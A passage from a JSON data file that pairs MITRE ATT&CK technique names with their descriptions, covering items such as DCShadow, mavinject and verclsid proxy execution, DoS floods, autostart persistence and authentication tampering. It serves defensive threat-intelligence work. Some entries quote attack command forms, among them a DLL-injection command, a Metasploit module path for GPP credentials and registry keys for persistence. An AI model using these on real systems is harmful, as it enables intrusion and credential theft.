can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback."
  ],
  "input capture: web portal capture": [
    "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)"
  ],
  "command and scripting interpreter: network device cli": [
    "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)"
  ],
  "indicator removal on host: clear linux or mac system logs": [
    "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n"
  ],
  "office application startup: outlook forms": [
    "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\nOnce malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)"
  ],
  "office application startup: outlook rules": [
    "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)\n\nOnce malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)"
  ],
  "supply chain compromise: compromise hardware supply chain": [
    "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals."
  ],
  "hardware additions": [
    "Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)"
  ],
  "user execution: malicious image": [
    "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)"
  ],
  "traffic signaling: port knocking": [
    "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs."
  ],
  "rogue domain controller": [
    "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)"
  ],
  "system script proxy execution": [
    "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)"
  ],
  "system binary proxy execution: verclsid": [
    "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) "
  ],
  "system binary proxy execution: mavinject": [
    "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)"
  ],
  "network denial of service: direct network flood": [
    "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)"
  ],
  "endpoint denial of service: os exhaustion flood": [
    "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)"
  ],
  "endpoint denial of service: service exhaustion flood": [
    "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)"
  ],
  "endpoint denial of service: application exhaustion flood": [
    "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)"
  ],
  "server software component: iis components": [
    "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)"
  ],
  "data from cloud storage object": [
    "Adversaries may access data from improperly secured cloud storage.\n\nMany cloud service providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. \n\nIn other cases, SaaS application providers such as Slack, Confluence, and Salesforce also provide cloud storage solutions as a peripheral use case of their platform. These cloud objects can be extracted directly from their associated application.(Citation: EA Hacked via Slack - June 2021)(Citation: SecureWorld - How Secure Is Your Slack Channel - Dec 2021)(Citation: HackerNews - 3 SaaS App Cyber Attacks - April 2022)(Citation: Dark Clouds_Usenix_Mulazzani_08_2011)\n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
  ],
  "unused/unsupported cloud regions": [
    "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)"
  ],
  "transfer data to cloud account": [
    "Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) "
  ],
  "pre-os boot": [
    "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses."
  ],
  "pre-os boot: rommonkit": [
    "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect."
  ],
  "pre-os boot: tftp boot": [
    "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)"
  ],
  "event triggered execution: change default file association": [
    "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)"
  ],
  "event triggered execution: trap": [
    "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)"
  ],
  "boot or logon autostart execution: authentication package": [
    "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded."
  ],
  "boot or logon autostart execution: security support provider": [
    "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)"
  ],
  "boot or logon autostart execution: re-opened applications": [
    "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user\u2019s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in."
  ],
  "boot or logon autostart execution: port monitors": [
    "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM."
  ],
  "boot or logon autostart execution: xdg autostart entries": [
    "Adversaries may modify XDG autostart entries to execute programs or commands during system boot. Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries. These entries will allow an application to automatically start during the startup of a desktop environment after user logon. By default, XDG autostart entries are stored within the <code>/etc/xdg/autostart</code> or <code>~/.config/autostart</code> directories and have a .desktop file extension.(Citation: Free Desktop Application Autostart Feb 2006)\n\nWithin an XDG autostart entry file, the <code>Type</code> key specifies if the entry is an application (type 1), link (type 2) or directory (type 3). The <code>Name</code> key indicates an arbitrary name assigned by the creator and the <code>Exec</code> key indicates the application and command line arguments to execute.(Citation: Free Desktop Entry Keys)\n\nAdversaries may use XDG autostart entries to maintain persistence by executing malicious commands and payloads, such as remote access tools, during the startup of a desktop environment. Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make XDG autostart entries look as if they are associated with legitimate programs."
  ],
  "boot or logon autostart execution: login items": [
    "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the \u201cSystem Events\u201d process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application \u201cSystem Events\u201d to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)"
  ],
  "unsecured credentials: group policy preferences": [
    "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\n"
  ],
  "unsecured credentials: container api": [
    "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. "
  ],
  "modify authentication process": [
    "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop."
  ],
  "modify authentication process: domain controller authentication": [
    "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)"
  ],
  "modify authentication process: password filter dll": [
    "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)"
  ],
  "modify authentication process: pluggable authentication modules": [
